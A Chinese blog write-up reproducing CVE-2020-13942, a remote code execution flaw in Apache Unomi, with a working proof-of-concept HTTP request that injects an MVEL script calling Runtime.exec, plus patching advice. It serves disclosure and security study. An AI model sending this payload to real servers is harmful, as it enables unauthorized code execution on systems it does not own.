![1610719037_60019f3d7bde2d0744026.png!small](https://image.3001.net/images/20210115/1610719037_60019f3d7bde2d0744026.png!small)

CVE -2020-13942 (Apache Unomi 远程代码执行漏洞)

## 一、漏洞描述：

Apache
Unomi是一个Java开源平台，这是一个Java服务器，旨在管理，潜在顾客和访问者的数据，并帮助个性化体验。Unomi可用于在非常不同的系统（例如CMS，CRM，问题跟踪器，本机移动应用程序等）中集成个性化和配置文件管理。

在Apache Unomi
1.5.1版本之前，攻击者可以通过精心构造的MVEL或ONGl表达式来发送恶意请求，使得Unomi服务器执行任意代码，漏洞对应编号为CVE-2020-11975，而CVE-2020-13942漏洞是对CVE-2020-11975漏洞的补丁绕过，攻击者绕过补丁检测的黑名单，发送恶意请求，在服务器执行任意代码。

## 二、影响版本：

Apache Unomi < 1.5.2

## 三、漏洞复现：

访问页面样式

![1610719037_60019f3de9a7e73a15125.png!small](https://image.3001.net/images/20210115/1610719037_60019f3de9a7e73a15125.png!small)

POC：

POST/context.jsonHTTP/1.1Host: localhost:8181User-Agent: Mozilla/5.0 (X11;
Ubuntu; Linux x86_64; rv:75.0) Gecko/20100101 Firefox/75.0Content-Length:
486{"filters": [ {"id":"boom","filters": [ {"condition": {"parameterValues":
{"":"script::Runtime r = Runtime.getRuntime(); r.exec(\"gnome-calculator\");"
},"type":"profilePropertyCondition" } } ] } ],"sessionId":"boom"}

抓包poc执行：

![1610719038_60019f3e8e41a61929803.png!small](https://image.3001.net/images/20210115/1610719038_60019f3e8e41a61929803.png!small)

查看DNSlog记录：

![1610719038_60019f3eeee03d58013f7.png!small](https://image.3001.net/images/20210115/1610719038_60019f3eeee03d58013f7.png!small)

尝试反弹shell：

![1610719039_60019f3f8392c91ac955f.png!small](https://image.3001.net/images/20210115/1610719039_60019f3f8392c91ac955f.png!small)

执行反弹shell命令脚本：

获取shell

![1610719039_60019f3fdc668a0fbf067.png!small](https://image.3001.net/images/20210115/1610719039_60019f3fdc668a0fbf067.png!small)

## 四、修复方案

1、尽可能避免将用户数据放入表达式解释器中。

2、目前厂商已发布最新版本，请受影响用户及时下载并更新至最新版本。官方链接如下：

https://unomi.apache.org/download.html

参考：

https://nosec.org/home/detail/4611.html

http://hnyongxu.com/index/SecurityIncidents/137.html

https://mp.weixin.qq.com/s/GebQxERJCmULLuRVRXsnYQ（阿乐）

https://github.com/lp008/CVE-2020-13942

免责声明：本站提供安全工具、程序(方法)可能带有攻击性，仅供安全研究与教学之用，风险自负!

转载声明：著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。

订阅查看更多复现文章、学习笔记

thelostworld

安全路上，与你并肩前行！！！！

![1610719040_60019f40361b97344f461.jpg!small](https://image.3001.net/images/20210115/1610719040_60019f40361b97344f461.jpg!small)

个人知乎：https://www.zhihu.com/people/fu-wei-43-69/columns

个人简书：https://www.jianshu.com/u/bf0e38a8d400

个人CSDN：https://blog.csdn.net/qq_37602797/category_10169006.html

![1610719040_60019f408209a7776f264.png!small](https://image.3001.net/images/20210115/1610719040_60019f408209a7776f264.png!small)

  

